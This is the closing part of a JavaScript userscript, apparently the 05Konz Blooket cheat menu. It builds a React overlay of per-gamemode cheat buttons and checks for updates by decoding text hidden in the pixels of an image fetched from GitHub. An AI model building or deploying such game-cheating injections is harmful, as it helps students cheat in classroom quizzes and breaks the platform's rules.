            }, (({ ctrl: ctrlHide, shift: shiftHide, alt: altHide, key: keyHide } = { ctrl: true, key: "e" }, { ctrl: ctrlClose, shift: shiftClose, alt: altClose, key: keyClose } = { ctrl: true, key: "x" }) => {
                return React.createElement(React.Fragment, null, `${[ctrlHide && "Ctrl", shiftHide && "Shift", altHide && "Alt", keyHide && keyHide.toUpperCase()].filter(Boolean).join(' + ')} to hide | ${[ctrlClose && "Ctrl", shiftClose && "Shift", altClose && "Alt", keyClose && keyClose.toUpperCase()].filter(Boolean).join(' + ')} for quick disable`, React.createElement("br", null), React.createElement(AntiBen, null, "Click and drag here"));
            })(settings.data.hide || {
                ctrl: true,
                key: "e"
            }, settings.data.close || {
                ctrl: true,
                key: "x"
            })), React.createElement("div", {
                id: styles.keys.credits
            }, React.createElement(AntiBen, null, "GitHub - 05Konz")), React.createElement("div", {
                id: styles.keys.cheatList
            }, React.createElement(AntiBen, {
                type: "span",
                style: {
                    textShadow: "1px 1px rgb(0 0 0 / 40%)"
                }
            }, "Cheats"), React.createElement("a", {
                href: "https://discord.gg/jHjGrrdXP6",
                target: "_blank",
                id: styles.keys.bigButton
            }, React.createElement("svg", {
                style: {
                    filter: "drop-shadow(2px 2px 0 rgb(0 0 0 / 20%))"
                },
                xmlns: "http://www.w3.org/2000/svg",
                width: "35",
                height: "35",
                fill: "currentColor",
                viewBox: "0 -1 21 16"
            }, React.createElement("path", {
                d: "M13.545 2.907a13.227 13.227 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.19 12.19 0 0 0-3.658 0 8.258 8.258 0 0 0-.412-.833.051.051 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.041.041 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032c.001.014.01.028.021.037a13.276 13.276 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019c.308-.42.582-.863.818-1.329a.05.05 0 0 0-.01-.059.051.051 0 0 0-.018-.011 8.875 8.875 0 0 1-1.248-.595.05.05 0 0 1-.02-.066.051.051 0 0 1 .015-.019c.084-.063.168-.129.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.052.052 0 0 1 .053.007c.08.066.164.132.248.195a.051.051 0 0 1-.004.085 8.254 8.254 0 0 1-1.249.594.05.05 0 0 0-.03.03.052.052 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.235 13.235 0 0 0 4.001-2.02.049.049 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.034.034 0 0 0-.02-.019Zm-8.198 7.307c-.789 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612Zm5.316 0c-.788 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612Z"
            })), React.createElement(AntiBen, {
                type: React.Fragment
            }, "Discord")), gamemodes.map(gamemode => {
                return React.createElement("div", {
                    key: gamemode,
                    onClick: () => setCurrentMode(gamemode),
                    className: styles.keys.cheatButton
                }, Cheats[gamemode].img ? React.createElement("img", {
                    src: Cheats[gamemode].img,
                    style: {
                        maxWidth: "30px",
                        maxHeight: "30px",
                        aspectRatio: "1 / 1",
                        marginRight: "10px",
                        ...(Cheats[gamemode].style || {})
                    },
                    alt: gamemode
                }) : React.createElement("div", {
                    style: {
                        marginInline: "5px",
                        width: "5px"
                    }
                }), React.createElement(Textfit, {
                    mode: "single",
                    forceSingleWidthMode: false,
                    min: 1,
                    max: 20
                }, Cheats[gamemode].name));
            })), React.createElement("div", {
                id: styles.keys.contentWrapper
            }, React.createElement("div", {
                id: styles.keys.content
            }, React.createElement(Tooltip, {
                place: "bottom",
                effect: "solid"
            }), React.createElement("div", {
                id: styles.keys.cheats
            }, Cheats[currentMode].element || (Cheats[currentMode].element = React.createElement(React.Fragment, null, React.createElement("div", {
                className: styles.keys.headerText
            }, React.createElement(AntiBen, null, Cheats[currentMode].name, " Cheats")), Cheats[currentMode].cheats.map(cheat => cheat.element || React.createElement(ScriptButton, {
                key: cheat.name,
                script: cheat
            }))))))))));
        }
        ReactDOM.render(createElement(GUI, null), GUIContainer);
        document.body.prepend(GUIContainer);
    });
    let img = new Image;
    img.src = "https://raw.githubusercontent.com/05Konz/Blooket-Cheats/main/autoupdate/timestamps/reactGui.png?" + Date.now();
    img.crossOrigin = "Anonymous";
    img.onload = function() {
        const c = document.createElement("canvas");
        const ctx = c.getContext("2d");
        ctx.drawImage(img, 0, 0, this.width, this.height);
        let { data } = ctx.getImageData(0, 0, this.width, this.height), decode = "", last;
        for (let i = 0; i < data.length; i += 4) {
            let char = String.fromCharCode(data[i + 1] * 256 + data[i + 2]);
            decode += char;
            if (char == "/" && last == "*") break;
            last = char;
        }
        let iframe = document.querySelector("iframe");
        const [_, time, error] = decode.match(/LastUpdated: (.+?); ErrorMessage: "(.+?)"/);
        if (parseInt(time) <= 1692818663155 || iframe.contentWindow.confirm(error)) cheat();
    }
    img.onerror = img.onabort = () => (img.src = null, cheat());
})();